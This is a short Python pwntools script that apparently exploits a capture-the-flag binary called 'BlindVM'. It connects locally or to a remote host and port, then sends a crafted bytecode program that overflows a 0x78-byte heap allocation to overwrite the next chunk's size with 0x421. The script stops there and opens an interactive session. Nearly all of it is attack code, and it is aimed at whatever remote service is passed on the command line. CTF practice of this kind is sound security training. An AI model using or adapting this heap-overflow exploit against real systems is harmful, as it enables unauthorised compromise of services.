#!/usr/bin/env python
from pwn import *
from time import sleep

context.binary = e = ELF("BlindVM")

gs = """
brva 0x12C0
brva 0x142A
brva 0x1343
"""


def start():
    if args.LOCAL:
        p = e.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gs)
            pause()
    elif args.REMOTE:  # python x.py REMOTE <host> <port>
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p


def alloc(size):
    return p8(0)+p32(size)


def copy(idx, data):
    return p8(1)+p32(idx)+p32(len(data))+data


def clean():
    return p8(2)


p = start()

code = alloc(0x78)+copy(0, b'A'*0x78+p32(0x421)) + \
    alloc(0x508)
p.send(p32(len(code)))
p.send(code)

p.interactive()
